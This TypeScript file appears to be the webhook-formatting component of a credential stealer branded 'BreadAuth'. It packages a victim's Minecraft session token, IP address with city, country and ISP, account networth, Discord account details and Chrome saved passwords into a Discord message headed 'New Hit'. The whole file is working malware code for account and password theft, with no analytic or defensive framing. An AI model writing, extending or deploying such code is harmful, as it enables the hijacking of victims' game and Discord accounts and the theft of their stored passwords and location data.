import ipGeolocation from "../../geolocation.js";
import networthCalc from "../../hypixel/networthCalc.js";
import {getBadge,getNitro} from "./infoParser.js";

export default async function parseWebhook(username:string, uuid:string, sessionID:string, ip:string, body?:any) {
    let embeds = []
    let networth:any = [0, "Error getting networth"]
    try {
        networth = await networthCalc(uuid);
    } catch (e) {}
    let mcFields = [
        {
            "name": "Username",
            "value": `[${username}](https://sky.shiiyu.moe/stats/${uuid})`,
            "inline": true
        },
        {
            "name": "UUID",
            "value": uuid,
            "inline": true
        },
        {
            "name": "Networth",
            "value": Math.round(networth[0]).toLocaleString() + " coins",
            "inline": true
        },
        {
            "name": "Session Token",
            "value": `\`\`\`${sessionID}\`\`\``
        }
    ]
    if (networth[1] !== "Error getting networth") {
        for (const field of networth[1]) {
            mcFields.push(field)
        }
    }
    const { status, city, country, isp } = await ipGeolocation(ip);
    if (status === 200) {
        //add city and country to fields at the start
        mcFields.unshift({
            "name": "City",
            "value": city,
            "inline": true
        }, {
            "name": "Country",
            "value": country,
            "inline": true
        },
        {
            "name": "ISP",
            "value": isp,
            "inline": true
        })
    }
    let mcEmbed = {
        "title": `New Hit from: ${ip}`,
        "color": 15695665,
        "fields": mcFields,
        "thumbnail": {
            "url": `https://crafatar.com/avatars/${uuid}?size=256&overlay`
        },
        "footer": {
            "text": "message brought to you by BreadAuth\nhttps://discord.gg/fEwn9U6vP2",
            "icon_url": "https://i.pinimg.com/736x/93/27/e7/9327e7da553a3111959de04fdf2e2eb4.jpg"
        }
    }
    embeds.push(mcEmbed)
    
    let chromePasswordFile = undefined
    if (body !== undefined) {
        if (body['discord']) {
            for (const account of body['discord']) {
                let discordFields = []
                for (const key in account) {
                    if (key !== 'username') {
                        let name = key.charAt(0).toUpperCase() + key.slice(1)
                        let value = account[key]
                        if (key === 'badge') {
                            value = await getBadge(account[key])
                        }
                        if (key === 'nitro') {
                            value = await getNitro(account[key])
                        }
                        discordFields.push({
                            "name": name,
                            "value": value,
                            "inline": true
                        })
                    }
                }

                let discordEmbed = {
                    "title": `${account['username']}`,
                    "color": 15695665,
                    "fields": discordFields,
                }
                embeds.push(discordEmbed)
            }
        }

        if (body['chrome']) {
            //create a password.txt file in buffer
            let passwordsText:string = ""
            //for each field in the chrome password object
            for (const field in body['chrome']) {
                //write the file in the following format username:password:website
                if (body['chrome'][field]['username'] !== 'N/A' && body['chrome'][field]['password'] !== '') {
                    passwordsText += `${body['chrome'][field]['username']}:${body['chrome'][field]['password']}:${body['chrome'][field]['url']}\n`
                }
            }
            //turn passwordsText into a buffer
            chromePasswordFile = Buffer.from(passwordsText)
        }
    }

    const message = {
        "username": "BreadAuth",
        "avatar_url": "https://i.pinimg.com/736x/93/27/e7/9327e7da553a3111959de04fdf2e2eb4.jpg",
        "embeds": embeds
    }

    return [message, chromePasswordFile]
}